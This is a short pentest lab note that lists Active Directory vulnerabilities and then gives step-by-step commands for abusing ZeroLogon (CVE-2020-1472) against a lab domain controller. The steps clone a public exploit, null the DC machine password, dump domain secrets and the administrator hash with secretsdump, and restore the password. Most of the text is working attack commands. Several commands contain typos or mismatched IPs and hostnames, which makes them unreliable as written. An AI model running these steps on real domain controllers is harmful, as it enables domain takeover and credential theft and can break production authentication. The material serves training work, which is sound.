## Overview

AD vulnerabilty occur all the time, look for them :
- ZeroLogon
- PrintNightmare
- Sam the Admin
- EthernalBlue

## Abusing ZeroLogon

When running this attack if we do not restore the password the DC breaks

Goal is to set authentification to null on this machine in order to be able to log on it without password

From Kali machine : 
cd /opt
mkdir CVE-2020-1472
cd CVE-2020-1472
git clone https://github.com/dirkjanm/CVE-2020-1472 //only use tester
./zerologon_check.py HYDRA-DC 192.168.138.132

This attack is not to be run if no restore option is available
python3 cve-2020-1472.py HYDRA-DC 192.168.138.132

Then use secretsdump:
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132
Keep password empty and click enter

Then get administrator hash
secretscump.py adminsitrator@192.168.163.132 -hash HASH //look for plain_password_hex to restore DC

Restore DC:
python3 restorepassword.py MARVEL\HYDRA-PC@HYDRA-DC -target-ip 192.168.138.132 -hexpass PLAIN_PASSWORD_HEX